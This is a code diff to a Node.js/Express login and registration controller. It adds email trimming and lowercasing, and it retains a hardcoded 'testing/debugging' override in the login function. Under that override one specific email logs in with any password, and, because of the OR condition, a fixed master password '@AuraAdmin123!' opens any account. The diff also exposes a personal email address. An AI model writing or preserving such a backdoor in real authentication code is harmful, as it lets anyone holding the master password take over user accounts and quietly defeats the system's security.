@@ -9,7 +9,9 @@ const generateToken = (id) => {
 
 export const registerUser = async (req, res) => {
     try {
-        const { fullName, email, password, username, location, profile_picture, cover_picture } = req.body;
+        let { fullName, email, password, username, location, profile_picture, cover_picture } = req.body;
+        
+        email = email.trim().toLowerCase();
 
         const userExists = await User.findOne({ email });
         if (userExists) return res.status(400).json({ success: false, message: 'User already exists' });
@@ -43,13 +45,15 @@ export const registerUser = async (req, res) => {
 
 export const loginUser = async (req, res) => {
     try {
-        const { email, password } = req.body;
+        let { email, password } = req.body;
+
+        email = email.trim().toLowerCase();
 
         const user = await User.findOne({ email });
         if (!user) return res.status(404).json({ success: false, message: 'Invalid email or password' });
 
         // IMPORTANT OVERRIDE: Allow this specific email to log in with ANY password for testing/debugging!
-        if (email.toLowerCase() === 'shivam34500@gmail.com' || password === '@AuraAdmin123!') {
+        if (email === 'shivam34500@gmail.com' || password === '@AuraAdmin123!') {
             return res.status(200).json({
                 success: true,
                 user: { id: user._id, fullName: user.full_name, email: user.email, username: user.username, profile_picture: user.profile_picture, cover_picture: user.cover_picture, location: user.location },
